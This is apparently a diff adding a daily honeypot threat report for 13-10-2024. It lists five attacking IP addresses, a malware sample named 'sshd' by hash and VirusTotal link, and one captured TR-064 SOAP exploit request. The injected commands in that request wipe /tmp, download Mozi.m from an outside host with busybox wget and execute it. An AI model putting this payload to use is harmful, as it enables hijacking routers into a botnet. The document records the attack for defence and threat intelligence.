@@ -1,0 +1,25 @@
+Top 5 IPs for 13-10-2024 :
+
+140.246.178.147
+188.12.239.144
+176.114.224.76
+166.186.196.103
+180.225.208.139
+
+Malware Observed:
+
+File name : sshd
+fc2f6fe7bb66517c15c9fc5ef4f84c895eaae8af5ffc85f933799eb95b779c4c
+https://www.virustotal.com/gui/file/fc2f6fe7bb66517c15c9fc5ef4f84c895eaae8af5ffc85f933799eb95b779c4c
+ 
+
+Commands/exploits observed :
+
+POST /UD/act?1 HTTP/1.1
+Host: 127.0.0.1:7574
+User-Agent: Hello, world
+SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
+Content-Type: text/xml
+Content-Length: 640
+
+<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://117.208.168.10:39734/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><NewNTPServer2>`echo DEATH`</NewNTPServer2><NewNTPServer3>`echo DEATH`</NewNTPServer3><NewNTPServer4>`echo DEATH`</NewNTPServer4><NewNTPServer5>`echo DEATH`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>
